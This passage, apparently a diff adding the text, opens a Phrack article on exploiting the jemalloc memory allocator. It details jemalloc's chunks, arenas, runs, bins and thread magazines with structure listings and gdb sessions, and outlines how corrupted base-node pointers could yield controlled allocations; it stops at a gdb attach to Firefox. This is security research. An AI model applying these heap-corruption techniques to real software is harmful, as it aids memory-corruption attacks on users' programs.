@@ -1,0 +1,2936 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x44, Phile #0x0a of 0x13
+
+|=-----------------------------------------------------------------------=|
+|=-------------------=[ Pseudomonarchia jemallocum ]=--------------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[ The false kingdom of jemalloc, or ]=------------------|
+|=-----------=[ On exploiting the jemalloc memory manager ]=-------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------------=[    argp | huku    ]=------------------------=|
+|=--------------------=[  {argp,huku}@grhack.net  ]=---------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+--[ Table of contents
+
+1 - Introduction
+  1.1 - Thousand-faced jemalloc
+2 - jemalloc memory allocator overview
+  2.1 - Basic structures
+    2.1.1 - Chunks (arena_chunk_t)
+    2.1.2 - Arenas (arena_t)
+    2.1.3 - Runs (arena_run_t)
+    2.1.4 - Regions/Allocations
+    2.1.5 - Bins (arena_bin_t)
+    2.1.6 - Huge allocations
+    2.1.7 - Thread caches (tcache_t)
+    2.1.8 - Unmask jemalloc
+  2.2 - Algorithms
+3 - Exploitation tactics
+  3.1 - Adjacent region corruption
+  3.2 - Heap manipulation
+  3.3 - Metadata corruption
+    3.3.1 - Run (arena_run_t)
+    3.3.2 - Chunk (arena_chunk_t)
+    3.3.3 - Thread caches (tcache_t)
+4 - A real vulnerability
+5 - Future work
+6 - Conclusion
+7 - References
+8 - Code
+
+--[ 1 - Introduction
+
+In this paper we investigate the security of the jemalloc allocator
+in both theory and practice. We are particularly interested in the
+exploitation of memory corruption bugs, so our security analysis will
+be biased towards that end.
+
+jemalloc is a userland memory allocator. It provides an implementation
+for the standard malloc(3) interface for dynamic memory management. It
+was written by Jason Evans (hence the 'je') for FreeBSD since there
+was a need for a high performance, SMP-enabled memory allocator for
+libc. After that, jemalloc was also used by the Mozilla Firefox browser
+as its internal dedicated custom memory allocator.
+
+All the above have led to a few versions of jemalloc that are very
+similar but not exactly the same. To summarize, there are three different
+widely used versions of jemalloc: 1) the standalone version [JESA],
+2) the version in the Mozilla Firefox web browser [JEMF], and 3) the
+FreeBSD libc [JEFB] version.
+
+The exploitation vectors we investigate in this paper have been tested
+on the jemalloc versions presented in subsection 1.1, all on the x86
+platform. We assume basic knowledge of x86 and a general familiarity
+with userland malloc() implementations, however these are not strictly
+required.
+
+
+----[ 1.1 - Thousand-faced jemalloc
+
+There are so many different jemalloc versions that we almost went crazy
+double checking everything in all possible platforms. Specifically, we
+tested the latest standalone jemalloc version (2.2.3 at the time of this
+writing), the version included in the latest FreeBSD libc (8.2-RELEASE),
+and the Mozilla Firefox web browser version 11.0. Furthermore, we also
+tested the Linux port of the FreeBSD malloc(3) implementation
+(jemalloc_linux_20080828a in the accompanying code archive) [JELX].
+
+
+--[ 2 - jemalloc memory allocator overview
+
+The goal of this section is to provide a technical overview of the
+jemalloc memory allocator. However, it is not all-inclusive. We will only
+focus on the details that are useful for understanding the exploitation
+attacks against jemalloc analyzed in the next section. The interested
+reader can look in [JE06] for a more academic treatment of jemalloc
+(including benchmarks, comparisons with other allocators, etc).
+
+Before we start our analysis we would like to point out that jemalloc (as
+well as other malloc implementations) does not implement concepts like
+'unlinking' or 'frontlinking' which have proven to be catalytic for the
+exploitation of dlmalloc and Microsoft Windows allocators. That said, we
+would like to stress the fact that the attacks we are going to present do
+not directly achieve a write-4-anywhere primitive. We, instead, focus on
+how to force malloc() (and possibly realloc()) to return a chunk that will
+most likely point to an already initialized memory region, in hope that
+the region in question may hold objects important for the functionality
+of the target application (C++ VPTRs, function pointers, buffer sizes and
+so on). Considering the various anti-exploitation countermeasures present
+in modern operating systems (ASLR, DEP and so on), we believe that such
+an outcome is far more useful for an attacker than a 4 byte overwrite.
+
+jemalloc, as a modern memory allocator should, recognizes that minimal
+page utilization is no longer the most critical feature. Instead it
+focuses on enhanced performance in retrieving data from the RAM. Based
+on the principle of locality which states that items that are allocated
+together are also used together, jemalloc tries to situate allocations
+contiguously in memory. Another fundamental design choice of jemalloc is
+its support for SMP systems and multi-threaded applications by trying
+to avoid lock contention problems between many simultaneously running
+threads. This is achieved by using many 'arenas' and the first time a
+thread calls into the memory allocator (for example by calling malloc(3))
+it is associated with a specific arena. The assignment of threads to
+arenas happens with three possible algorithms: 1) with a simple hashing
+on the thread's ID if TLS is available 2) with a simple builtin linear
+congruential pseudo random number generator in case MALLOC_BALANCE is
+defined and TLS is not available 3) or with the traditional round-robin
+algorithm. For the later two cases, the association between a thread
+and an arena doesn't stay the same for the whole life of the thread.
+
+Continuing our high-level overview of the main jemalloc structures
+before we dive into the details in subsection 2.1, we have the concept of
+'chunks'. jemalloc divides memory into chunks, always of the same size,
+and uses these chunks to store all of its other data structures (and
+user-requested memory as well). Chunks are further divided into 'runs'
+that are responsible for requests/allocations up to certain sizes. A run
+keeps track of free and used 'regions' of these sizes. Regions are the
+heap items returned on user allocations (e.g. malloc(3) calls). Finally,
+each run is associated with a 'bin'. Bins are responsible for storing
+structures (trees) of free regions.
+
+The following diagram illustrates in an abstract manner the relationships
+between the basic building blocks of jemalloc.
+
+  Chunk #0                           Chunk #1
+.--------------------------------. .--------------------------------.
+|                                | |                                |
+|   Run #0         Run #1        | |   Run #0         Run #1        |
+| .-------------..-------------. | | .-------------..-------------. |
+| |             ||             | | | |             ||             | |
+| |   Page      ||   Page      | | | |   Page      ||   Page      | |
+| | .---------. || .---------. | | | | .---------. || .---------. | |
+| | |         | || |         | | | | | |         | || |         | | | ...
+| | | Regions | || | Regions | | | | | | Regions | || | Regions | | |
+| | |[] [] [] | || |[] [] [] | | | | | |[] [] [] | || |[] [] [] | | |
+| | | ^     ^ | || |         | | | | | | ^     ^ | || |         | | |
+| | `-|-----|-' || `---------' | | | | `-|-----|-' || `---------' | |
+| `---|-----|---'`-------------' | | `---|-----|---'`-------------' |
+`-----|-----|--------------------' `-----|-----|--------------------'
+      |     |                            |     |
+      |     |                            |     |
+  .---|-----|----------.             .---|-----|----------.
+  |   |     |          |             |   |     |          |
+  | free regions' tree | ...         | free regions' tree | ...
+  |                    |             |                    |
+  `--------------------'             `--------------------'
+  bin[Chunk #0][Run #0]              bin[Chunk #1][Run #0]
+
+
+----[ 2.1 - Basic structures
+
+In the following paragraphs we analyze in detail the basic jemalloc
+structures. Familiarity with these structures is essential in order to
+begin our understanding of the jemalloc internals and proceed to the
+exploitation step.
+
+
+------[ 2.1.1 - Chunks (arena_chunk_t)
+
+If you are familiar with Linux heap exploitation (and more precisely with
+dlmalloc internals) you have probably heard of the term 'chunk' before. In
+dlmalloc, the term 'chunk' is used to denote the memory regions returned
+by malloc(3) to the end user. We hope you get over it soon because when it
+comes to jemalloc the term 'chunk' is used to describe big virtual memory
+regions that the memory allocator conceptually divides available memory
+into. The size of the chunk regions may vary depending on the jemalloc
+variant used. For example, on FreeBSD 8.2-RELEASE, a chunk is a 1 MB region
+(aligned to its size), while on the latest FreeBSD (in CVS at the time of
+this writing) a jemalloc chunk is a region of size 2 MB. Chunks are the
+highest abstraction used in jemalloc's design, that is the rest of the
+structures described in the following paragraphs are actually placed within
+a chunk somewhere in the target's memory.
+
+The following are the chunk sizes in the jemalloc variants we have
+examined:
+
+                +---------------------------------------+
+                | jemalloc variant         | Chunk size |
+                +---------------------------------------+
+                | FreeBSD 8.2-RELEASE      |    1 MB    |
+                -----------------------------------------
+                | Standalone v2.2.3        |    4 MB    |
+                -----------------------------------------
+                | jemalloc_linux_20080828a |    1 MB    |
+                -----------------------------------------
+                | Mozilla Firefox v5.0     |    1 MB    |
+                -----------------------------------------
+                | Mozilla Firefox v7.0.1   |    1 MB    |
+                -----------------------------------------
+                | Mozilla Firefox v11.0    |    1 MB    |
+                -----------------------------------------
+
+An area of jemalloc managed memory divided into chunks looks like the
+following diagram. We assume a chunk size of 4 MB; remember that chunks are
+aligned to their size. The address 0xb7000000 does not have a particular
+significance apart from illustrating the offsets between each chunk.
+
++-------------------------------------------------------------------------+
+|         Chunk alignment        |             Chunk content              |
++-------------------------------------------------------------------------+
+| Chunk #1 starts at: 0xb7000000 [  Arena                                 ]
+| Chunk #2 starts at: 0xb7400000 [  Arena                                 ]
+| Chunk #3 starts at: 0xb7800000 [  Arena                                 ]
+| Chunk #4 starts at: 0xb7c00000 [  Arena                                 ]
+| Chunk #5 starts at: 0xb8000000 [  Huge allocation region, see below     ]
+| Chunk #6 starts at: 0xb8400000 [  Arena                                 ]
+| Chunk #7 starts at: 0xb8800000 [  Huge allocation region                ]
+| Chunk #8 starts at: 0xb8c00000 [  Huge allocation region                ]
+| Chunk #9 starts at: 0xb9000000 [  Arena                                 ]
++-------------------------------------------------------------------------+
+
+Huge allocation regions are memory regions managed by jemalloc chunks that 
+satisfy huge malloc(3) requests. Apart from the huge size class, jemalloc 
+also has the small/medium and large size classes for end user allocations 
+(both managed by arenas). We analyze jemalloc's size classes of regions in 
+subsection 2.1.4.
+
+Chunks are described by 'arena_chunk_t' structures (taken from the
+standalone version of jemalloc; we have added and removed comments in
+order to make things more clear):
+
+
+[2-1]
+
+typedef struct arena_chunk_s arena_chunk_t;
+struct arena_chunk_s
+{
+    /* The arena that owns this chunk. */
+    arena_t *arena;
+
+    /* A list of the corresponding arena's dirty chunks. */
+    ql_elm(arena_chunk_t) link_dirty;
+
+    /* 
+     * Whether this chunk contained at some point one or more dirty pages.
+     */
+    bool dirtied;
+
+    /* This chunk's number of dirty pages. */
+    size_t ndirty;
+
+    /*
+     * A chunk map element corresponds to a page of this chunk. The map
+     * keeps track of free and large/small regions.
+     */
+    arena_chunk_map_t map[];
+};
+
+
+The main use of chunk maps in combination with the memory alignment of the
+chunks is to enable constant time access to the management metadata of free
+and large/small heap allocations (regions).
+
+
+------[ 2.1.2 - Arenas (arena_t)
+
+An arena is a structure that manages the memory areas jemalloc divides
+into chunks. Arenas can span more than one chunk, and depending on the
+size of the chunks, more than one page as well. As we have already
+mentioned, arenas are used to mitigate lock contention problems between
+threads. Therefore, allocations and deallocations from a thread always
+happen on the same arena. Theoretically, the number of arenas is in direct
+relation to the need for concurrency in memory allocation. In practice the
+number of arenas depends on the jemalloc variant we deal with. For example,
+in Firefox's jemalloc there is only one arena. In the case of single-CPU
+systems there is also only one arena. In SMP systems the number of arenas
+is equal to either two (in FreeBSD 8.2) or four (in the standalone variant)
+times the number of available CPU cores. Of course, there is always at
+least one arena.
+
+Debugging the standalone variant with gdb:
+
+
+gdb $ print ncpus
+$86 = 0x4
+gdb $ print narenas
+$87 = 0x10
+
+
+Arenas are the central jemalloc data structures as they are used to manage
+the chunks (and the underlying pages) that are responsible for the small
+and large allocation size classes. Specifically, the arena structure is
+defined as follows:
+
+
+[2-2]
+
+typedef struct arena_s arena_t;
+struct arena_s
+{
+    /* This arena's index in the arenas array. */
+    unsigned ind;
+
+    /* Number of threads assigned to this arena. */
+    unsigned nthreads;
+
+    /* Mutex to protect certain operations. */
+    malloc_mutex_t lock;
+
+    /*
+     * Chunks that contain dirty pages managed by this arena. When jemalloc
+     * requires new pages these are allocated first from the dirty pages.
+     */
+    ql_head(arena_chunk_t) chunks_dirty;
+
+    /*
+     * Each arena has a spare chunk in order to cache the most recently
+     * freed chunk.
+     */
+    arena_chunk_t *spare;
+
+    /* The number of pages in this arena's active runs. */
+    size_t nactive;
+
+    /* The number of pages in unused runs that are potentially dirty. */
+    size_t ndirty;
+
+    /* The number of pages this arena's threads are attempting to purge. */
+    size_t npurgatory;
+
+    /* 
+     * Ordered tree of this arena's available clean runs, i.e. runs
+     * associated with clean pages.
+     */
+    arena_avail_tree_t runs_avail_clean;
+
+    /*
+     * Ordered tree of this arena's available dirty runs, i.e. runs
+     * associated with dirty pages.
+     */
+    arena_avail_tree_t runs_avail_dirty;
+
+    /* 
+     * Bins are used to store structures of free regions managed by this
+     * arena.
+     */
+    arena_bin_t bins[];
+};
+
+
+All in all a fairly simple structure. As it is clear from the above
+structure, the allocator contains a global array of arenas and an unsigned
+integer representing the number of these arenas:
+
+
+arena_t     **arenas;
+unsigned    narenas;
+
+
+And using gdb we can see the following:
+
+
+gdb $ x/x arenas
+0xb7800cc0: 0xb7800740
+gdb $ print arenas[0]
+$4 = (arena_t *) 0xb7800740
+gdb $ x/x &narenas
+0xb7fdfdc4 <narenas>:   0x00000010
+
+
+At 0xb7800740 we have 'arenas[0]', that is the first arena, and at
+0xb7fdfdc4 we have the number of arenas, i.e 16.
+
+
+------[ 2.1.3 - Runs (arena_run_t)
+
+Runs are further memory denominations of the memory divided by jemalloc
+into chunks. Runs exist only for small and large allocations (see
+subsection 2.1.1), but not for huge allocations. In essence, a chunk
+is broken into several runs. Each run is actually a set of one or more
+contiguous pages (but a run cannot be smaller than one page). Therefore,
+they are aligned to multiples of the page size. The runs themselves may
+be non-contiguous but they are as close as possible due to the tree search
+heuristics implemented by jemalloc.
+
+The main responsibility of a run is to keep track of the state (i.e. free
+or used) of end user memory allocations, or regions as these are called in
+jemalloc terminology. Each run holds regions of a specific size (however
+within the small and large size classes as we have mentioned) and their
+state is tracked with a bitmask. This bitmask is part of a run's metadata;
+these metadata are defined with the following structure:
+
+
+[2-3]
+
+typedef struct arena_run_s arena_run_t;
+struct arena_run_s
+{
+    /*
+     * The bin that this run is associated with. See 2.1.5 for details on
+     * the bin structures.
+     */
+    arena_bin_t *bin;
+    
+    /*
+     * The index of the next region of the run that is free. On the FreeBSD
+     * and Firefox flavors of jemalloc this variable is named regs_minelm.
+     */
+    uint32_t nextind;
+    
+    /* The number of free regions in the run. */
+    unsigned nfree;
+
+    /*
+     * Bitmask for the regions in this run. Each bit corresponds to one
+     * region. A 0 means the region is used, and an 1 bit value that the
+     * corresponding region is free. The variable nextind (or regs_minelm
+     * on FreeBSD and Firefox) is the index of the first non-zero element
+     * of this array.
+     */
+    unsigned regs_mask[];
+};
+
+
+Don't forget to re-read the comments ;)
+
+
+------[ 2.1.4 - Regions/Allocations
+
+In jemalloc the term 'regions' applies to the end user memory areas
+returned by malloc(3). As we have briefly mentioned earlier, regions are
+divided into three classes according to their size, namely a) small/medium,
+b) large and c) huge.
+
+Huge regions are considered those that are bigger than the chunk size minus
+the size of some jemalloc headers. For example, in the case that the chunk
+size is 4 MB (4096 KB) then a huge region is an allocation greater than
+4078 KB. Small/medium are the regions that are smaller than a page. Large
+are the regions that are smaller than the huge regions (chunk size minus
+some headers) and also larger than the small/medium regions (page size).
+
+Huge regions have their own metadata and are managed separately from
+small/medium and large regions. Specifically, they are managed by a
+global to the allocator red-black tree and they have their own dedicated
+and contiguous chunks. Large regions have their own runs, that is each
+large allocation has a dedicated run. Their metadata are situated on
+the corresponding arena chunk header. Small/medium regions are placed
+on different runs according to their specific size. As we have seen in
+2.1.3, each run has its own header in which there is a bitmask array
+specifying the free and the used regions in the run.
+
+In the standalone flavor of jemalloc the smallest run is that for regions
+of size 4 bytes. The next run is for regions of size 8 bytes, the next
+for 16 bytes, and so on.
+
+When we do not mention it specifically, we deal with small/medium and
+large region classes. We investigate the huge region size class separately
+in subsection 2.1.6.
+
+
+------[ 2.1.5 - Bins (arena_bin_t)
+
+Bins are used by jemalloc to store free regions. Bins organize the free
+regions via runs and also keep metadata about their regions, like for
+example the size class, the total number of regions, etc. A specific bin 
+may be associated with several runs, however a specific run can only be
+associated with a specific bin, i.e. there is an one-to-many correspondence
+between bins and runs. Bins have their associated runs organized in a tree.
+
+Each bin has an associated size class and stores/manages regions of this
+size class. A bin's regions are managed and accessed through the bin's
+runs. Each bin has a member element representing the most recently used run
+of the bin, called 'current run' with the variable name runcur. A bin also
+has a tree of runs with available/free regions. This tree is used when the
+current run of the bin is full, that is it doesn't have any free regions.
+
+A bin structure is defined as follows:
+
+
+[2-4]
+
+typedef struct arena_bin_s arena_bin_t;
+struct arena_bin_s
+{
+    /*
+     * Operations on the runs (including the current run) of the bin
+     * are protected via this mutex.
+     */
+    malloc_mutex_t lock;
+
+    /*
+     * The current run of the bin that manages regions of this bin's size
+     * class.
+     */
+    arena_run_t *runcur;
+
+    /*
+     * The tree of the bin's associated runs (all responsible for regions
+     * of this bin's size class of course).
+     */
+    arena_run_tree_t runs;
+
+    /* The size of this bin's regions. */
+    size_t reg_size;
+    
+    /*
+     * The total size of a run of this bin. Remember that each run may be
+     * comprised of more than one pages.
+     */
+    size_t run_size;
+    
+    /* The total number of regions in a run of this bin. */
+    uint32_t nregs;
+    
+    /*
+     * The total number of elements in the regs_mask array of a run of this
+     * bin. See 2.1.3 for more information on regs_mask.
+     */
+    uint32_t regs_mask_nelms;
+    
+    /*
+     * The offset of the first region in a run of this bin. This can be 
+     * non-zero due to alignment requirements.
+     */
+    uint32_t reg0_offset;
+};
+
+
+As an example, consider the following three allocations and that the
+jemalloc flavor under investigation has 2 bytes as the smallest possible
+allocation size (file test-bins.c in the code archive, example run on
+FreeBSD):
+
+
+one = malloc(2);
+two = malloc(8);
+three = malloc(16);
+
+
+Using gdb let's explore jemalloc's structures. First let's see the runs
+that the above allocations created in their corresponding bins:
+
+
+gdb $ print arenas[0].bins[0].runcur
+$25 = (arena_run_t *) 0xb7d01000
+gdb $ print arenas[0].bins[1].runcur
+$26 = (arena_run_t *) 0x0
+gdb $ print arenas[0].bins[2].runcur
+$27 = (arena_run_t *) 0xb7d02000
+gdb $ print arenas[0].bins[3].runcur
+$28 = (arena_run_t *) 0xb7d03000
+gdb $ print arenas[0].bins[4].runcur
+$29 = (arena_run_t *) 0x0
+
+
+Now let's see the size classes of these bins:
+
+
+gdb $ print arenas[0].bins[0].reg_size
+$30 = 0x2
+gdb $ print arenas[0].bins[1].reg_size
+$31 = 0x4
+gdb $ print arenas[0].bins[2].reg_size
+$32 = 0x8
+gdb $ print arenas[0].bins[3].reg_size
+$33 = 0x10
+gdb $ print arenas[0].bins[4].reg_size
+$34 = 0x20
+
+
+We can see that our three allocations of sizes 2, 8 and 16 bytes resulted
+in jemalloc creating runs for these size classes. Specifically, 'bin[0]'
+is responsible for the size class 2 and its current run is at 0xb7d01000,
+'bin[1]' is responsible for the size class 4 and doesn't have a current
+run since no allocations of size 4 were made, 'bin[2]' is responsible
+for the size class 8 with its current run at 0xb7d02000, and so on. In the
+code archive you can find a Python script for gdb named unmask_jemalloc.py
+for easily enumerating the size of bins and other internal information in
+the various jemalloc flavors (see 2.1.8 for a sample run).
+
+At this point we should mention that in jemalloc an allocation of zero
+bytes (that is a malloc(0) call) will return a region of the smallest size
+class; in the above example a region of size 2. The smallest size class
+depends on the flavor of jemalloc. For example, in the standalone flavor it
+is 4 bytes.
+
+The following diagram summarizes our analysis of jemalloc up to this point:
+
+   .----------------------------------.       .---------------------------.
+ .----------------------------------. |    +--+-----> arena_chunk_t       |
+.---------------------------------. | |    |  |                           |
+|             arena_t             | | |    |  |  .---------------------.  |
+|                                 | | |    |  |  |                     |  |
+| .--------------------.          | | |    |  |  |     arena_run_t     |  |
+| | arena_chunk_t list |-----+    | | |    |  |  |                     |  |
+| `--------------------'     |    | | |    |  |  |    .-----------.    |  |
+|                            |    | | |    |  |  |    |   page    |    |  |
+|   arena_bin_t bins[];      |    | | |    |  |  |    +-----------+    |  |
+| .------------------------. |    | | |    |  |  |    |  region   |    |  |
+| | bins[0]  ...  bins[27] | |    | | |    |  |  |    +-----------+    |  |
+| `------------------------' |    | |.'    |  |  |    |  region   |    |  |
+|     |                      |    |.'      |  |  |    +-----------+    |  |
+`-----+----------------------+----'        |  |  |    |  region   |    |  |
+      |                      |             |  |  |    +-----------+    |  |
+      |                      |             |  |  |        . . .        |  |
+      |                      v             |  |  |    .-----------.    |  |
+      |            .-------------------.   |  |  |    |   page    |    |  |
+      |            | .---------------. |   |  |  |    +-----------+    |  |
+      |            | | arena_chunk_t |-+---+  |  |    |  region   |    |  |
+      |            | `---------------' |      |  |    +-----------+    |  |
+      |     [2-5]  | .---------------. |      |  |    |  region   |    |  |
+      |            | | arena_chunk_t | |      |  |    +-----------+    |  |
+      |            | `---------------' |      |  |    |  region   |    |  |
+      |            |       . . .       |      |  |    +-----------+    |  |
+      |            | .---------------. |      |  |                     |  |
+      |            | | arena_chunk_t | |      |  `---------------------'  |
+      |            | `---------------' |      |          [2-6]            |
+      |            |       . . .       |      |  .---------------------.  |
+      |            `-------------------'      |  |                     |  |
+      |                                  +----+--+---> arena_run_t     |  |
+      |                                  |    |  |                     |  |
+      +----------+                       |    |  |    .-----------.    |  |
+                 |                       |    |  |    |   page    |    |  |
+                 |                       |    |  |    +-----------+    |  |
+                 |                       |    |  |    |  region   |    |  |
+                 v                       |    |  |    +-----------+    |  |
+    .--------------------------.         |    |  |    |  region   |    |  |
+    |       arena_bin_t        |         |    |  |    +-----------+    |  |
+    |     bins[0] (size 8)     |         |    |  |    |  region   |    |  |
+    |                          |         |    |  |    +-----------+    |  |
+    | .----------------------. |         |    |  |        . . .        |  |
+    | | arena_run_t *runcur; |-+---------+    |  |    .-----------.    |  |
+    | `----------------------' |              |  |    |   page    |    |  |
+    `--------------------------'              |  |    +-----------+    |  |
+                                              |  |    |  region   |    |  |
+                                              |  |    +-----------+    |  |
+                                              |  |    |  region   |    |  |
+                                              |  |    +-----------+    |  |
+                                              |  |    |  region   |    |  |
+                                              |  |    +-----------+    |  |
+                                              |  |                     |  |
+                                              |  `---------------------'  |
+                                              `---------------------------'
+
+
+------[ 2.1.6 - Huge allocations
+
+Huge allocations are not very interesting for the attacker but they are an
+integral part of jemalloc which may affect the exploitation process. Simply
+put, huge allocations are represented by 'extent_node_t' structures that 
+are ordered in a global red black tree which is common to all threads.
+
+
+[2-7]
+
+/* Tree of extents. */
+typedef struct extent_node_s extent_node_t;
+struct extent_node_s {
+    #ifdef MALLOC_DSS
+        /* Linkage for the size/address-ordered tree. */
+        rb_node(extent_node_t) link_szad;
+    #endif
+
+    /* Linkage for the address-ordered tree. */
+    rb_node(extent_node_t) link_ad;
+
+    /* Pointer to the extent that this tree node is responsible for. */
+    void *addr;
+
+    /* Total region size. */
+    size_t size;
+};
+typedef rb_tree(extent_node_t) extent_tree_t;
+
+
+The 'extent_node_t' structures are allocated in small memory regions
+called base nodes. Base nodes do not affect the layout of end user heap
+allocations since they are served either by the DSS or by individual
+memory mappings acquired by 'mmap()'. The actual method used to allocate
+free space depends on how jemalloc was compiled with 'mmap()' being
+the default.
+
+
+/* Allocate an extent node with which to track the chunk. */
+node = base_node_alloc();
+...
+
+ret = chunk_alloc(csize, zero);
+...
+
+/* Insert node into huge. */
+node->addr = ret;
+node->size = csize;
+...
+
+malloc_mutex_lock(&huge_mtx);
+extent_tree_ad_insert(&huge, node);
+
+
+The most interesting thing about huge allocations is the fact that free
+base nodes are kept in a simple array of pointers called 'base_nodes'. The
+aforementioned array, although defined as a simple pointer, it's handled
+as if it was a two dimensional array holding pointers to available base
+nodes.
+
+
+static extent_node_t *base_nodes;
+...
+
+static extent_node_t *
+base_node_alloc(void)
+{
+    extent_node_t *ret;
+
+    malloc_mutex_lock(&base_mtx);
+    if (base_nodes != NULL) {
+        ret = base_nodes;
+        base_nodes = *(extent_node_t **)ret;
+        ...
+    }
+    ...
+}
+
+static void
+base_node_dealloc(extent_node_t *node)
+{
+    malloc_mutex_lock(&base_mtx);
+    *(extent_node_t **)node = base_nodes;
+    base_nodes = node;
+    ...
+}
+
+
+Taking into account how 'base_node_alloc()' works, it's obvious that if
+an attacker corrupts the pages that contain the base node pointers, she
+can force jemalloc to use an arbitrary address as a base node pointer. This
+itself can lead to interesting scenarios but they are out of the scope
+of this article since the chances of achieving something like this are
+quite low. Nevertheless, a quick review of the code reveals that one
+may be able to achieve this goal by forcing huge allocations once she
+controls the physically last region of an arena. The attack is possible
+if and only if the mappings that will hold the base pointers are allocated
+right after the attacker controlled region.
+
+A careful reader would have noticed that if an attacker manages to pass
+a controlled value as the first argument to 'base_node_dealloc()' she
+can get a '4bytes anywhere' result. Unfortunately, as far as the authors
+can see, this is possible only if the global red black tree holding the
+huge allocations is corrupted. This situation is far more difficult to
+achieve than the one described in the previous paragraph. Nevertheless,
+we would really like to hear from anyone that manages to do so.
+
+
+------[ 2.1.7 - Thread caches (tcache_t)
+
+In the previous paragraphs we mentioned how jemalloc allocates new arenas
+at will in order to avoid lock contention. In this section we will focus on
+the mechanisms that are activated on multicore systems and multithreaded
+programs.
+
+Let's set the following straight:
+
+1) A multicore system is the reason jemalloc allocates more than one arena.
+On a unicore system there's only one available arena, even on multithreaded
+applications. However, the Firefox jemalloc variant has just one arena
+hardcoded, therefore it has no thread caches.
+
+2) On a multicore system, even if the target application runs on a single
+thread, more than one arenas are used.
+
+No matter what the number of cores on the system is, a multithreaded
+application utilizing jemalloc will make use of the so called 'magazines'
+(also called 'tcaches' on newer versions of jemalloc). Magazines (tcaches)
+are thread local structures used to avoid thread blocking problems.
+Whenever a thread wishes to allocate a memory region, jemalloc will use
+those thread specific data structures instead of following the normal code
+path.
+
+
+void *
+arena_malloc(arena_t *arena, size_t size, bool zero)
+{
+    ...
+
+    if (size <= bin_maxclass) {
+#ifdef MALLOC_MAG
+        if (__isthreaded && opt_mag) {
+            mag_rack_t *rack = mag_rack;
+            if (rack == NULL) {
+                rack = mag_rack_create(arena);
+                ...
+
+                return (mag_rack_alloc(rack, size, zero));
+            }
+            else
+#endif
+                return (arena_malloc_small(arena, size, zero));
+        }
+        ...
+}
+
+
+The 'opt_mag' variable is true by default. The variable '__isthreaded' is
+exported by 'libthr', the pthread implementation for FreeBSD and is set to
+1 on a call to 'pthread_create()'. Obviously, the rest of the details are
+out of the scope of this article.
+
+In this section we will analyze thread magazines, but the exact same
+principles apply on the tcaches (the change in the nomenclature is probably
+the most notable difference between them).
+
+The behavior of thread magazines is affected by the following macros that
+are _defined_:
+
+  MALLOC_MAG - Make use of thread magazines.
+
+  MALLOC_BALANCE - Balance arena usage using a simple linear random number
+  generator (have a look at 'choose_arena()').
+
+The following constants are _undefined_:
+
+  NO_TLS - TLS _is_ available on __i386__
+
+Furthermore, 'opt_mag', the jemalloc runtime option controlling thread
+magazine usage, is, as we mentioned earlier, enabled by default.
+
+The following figure depicts the relationship between the various thread
+magazines' structures.
+
+
+.-------------------------------------------.
+|                mag_rack_t                 |
+|                                           |
+|           bin_mags_t bin_mags[];          |
+|                                           |
+|  .-------------------------------------.  |
+|  | bin_mags[0] ... bin_mags[nbins - 1] |  |
+|  `-------------------------------------'  |
+`--------|----------------------------------'
+         |
+         |                                   .------------------.
+         |                      +----------->|      mag_t       |
+         v                      |            |                  |
+.----------------------.        |            |  void *rounds[]  |
+|      bin_mags_t      |        |            |       ...        |
+|                      |        |            `------------------'
+|  .----------------.  |        |
+|  | mag_t *curmag; |-----------+
+|  `----------------'  |
+|         ...          |
+`----------------------'
+
+
+The core of the aforementioned thread local metadata is the 'mag_rack_t'. A
+'mag_rack_t' is a simplified equivalent of an arena. It is composed of a
+single array of 'bin_mags_t' structures. Each thread in a program is
+associated with a private 'mag_rack_t' which has a lifetime equal to the
+application's.
+
+
+typedef struct mag_rack_s mag_rack_t;
+struct mag_rack_s {
+    bin_mags_t bin_mags[1]; /* Dynamically sized. */
+};
+
+
+Bins belonging to magazine racks are represented by 'bin_mags_t' structures
+(notice the plural form).
+
+
+/*
+ * Magazines are lazily allocated, but once created, they remain until the
+ * associated mag_rack is destroyed.
+ */
+typedef struct bin_mags_s bin_mags_t;
+struct bin_mags_s {
+    mag_t *curmag;
+    mag_t *sparemag;
+};
+
+typedef struct mag_s mag_t;
+struct mag_s {
+    size_t binind; /* Index of associated bin. */
+    size_t nrounds;
+    void *rounds[1]; /* Dynamically sized. */
+};
+
+
+Just like a normal bin is associated with a run, a 'bin_mags_t' structure
+is associated with a magazine pointed by 'curmag' (recall 'runcur'). A
+magazine is nothing special but a simple array of void pointers which hold
+memory addresses of preallocated memory regions which are exclusively used
+by a single thread. Magazines are populated in function 'mag_load()' as
+seen below.
+
+
+void
+mag_load(mag_t *mag)
+{
+    arena_t *arena;
+    arena_bin_t *bin;
+    arena_run_t *run;
+    void *round;
+    size_t i;
+
+    /* Pick a random arena and the bin responsible for servicing
+     * the required size class.
+     */
+    arena = choose_arena();
+    bin = &arena->bins[mag->binind];
+    ...
+
+    for (i = mag->nrounds; i < max_rounds; i++) {
+        ...
+
+        if ((run = bin->runcur) != NULL && run->nfree > 0)
+            round = arena_bin_malloc_easy(arena, bin, run); /* [3-23] */
+        else
+            round = arena_bin_malloc_hard(arena, bin); /* [3-24] */
+
+        if (round == NULL)
+            break;
+
+        /* Each 'rounds' holds a preallocated memory region. */
+        mag->rounds[i] = round;
+    }
+
+    ...
+    mag->nrounds = i;
+}
+
+
+When a thread calls 'malloc()', the call chain eventually reaches
+'mag_rack_alloc()' and then 'mag_alloc()'.
+
+
+/* Just return the next available void pointer. It points to one of the
+ * preallocated memory regions.
+ */
+void *
+mag_alloc(mag_t *mag)
+{
+    if (mag->nrounds == 0)
+        return (NULL);
+    mag->nrounds--;
+
+    return (mag->rounds[mag->nrounds]);
+}
+
+
+The most notable thing about magazines is the fact that 'rounds', the array
+of void pointers, as well as all the related thread metadata (magazine
+racks, magazine bins and so on) are allocated by normal calls to functions
+'arena_bin_malloc_xxx()' ([3-23], [3-24]). This results in the thread
+metadata lying around normal memory regions.
+
+
+------[ 2.1.8 - Unmask jemalloc
+
+As we are sure you are all aware, since version 7.0, gdb can be scripted
+with Python. In order to unmask and bring to light the internals of the
+various jemalloc flavors, we have developed a Python script for gdb
+appropriately named unmask_jemalloc.py.  The following is a sample run of
+the script on Firefox 11.0 on Linux x86 (edited for readability):
+
+
+$ ./firefox-bin &
+
+$ gdb -x ./gdbinit -p `ps x | grep firefox | grep -v grep \
+| grep -v debug | awk '{print $1}'`
+
+GNU gdb (GDB) 7.4-debian
+...
+Attaching to process 3493
